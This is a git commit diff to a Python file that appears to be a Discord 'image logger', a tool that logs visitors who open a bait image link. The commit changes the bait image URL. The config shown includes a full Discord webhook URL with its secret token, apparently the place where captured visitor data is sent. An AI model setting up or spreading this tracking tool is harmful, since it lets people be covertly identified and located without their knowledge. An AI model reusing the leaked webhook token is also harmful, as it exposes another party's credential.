11dd66ccbaaa099ea716e8adcdb40a069a8f67ac
MrHB102 <heronottcl1@outlook.com>
2026-04-12 18:15:49 -0300

    Update DAVID4.py

--- api/DAVID4.py
+++ api/DAVID4.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1492995347507839127/fiB5exHabYHsvPAkYplSOtV9lQnnqYkuZDXDe3DAwTJqUGVr0JSo6WQBT34FJEF-D04N",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "image": "https://raw.githubusercontent.com/MrHB102/private/refs/heads/main/image/Captura%20de%20tela%202026-02-27%20012827.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
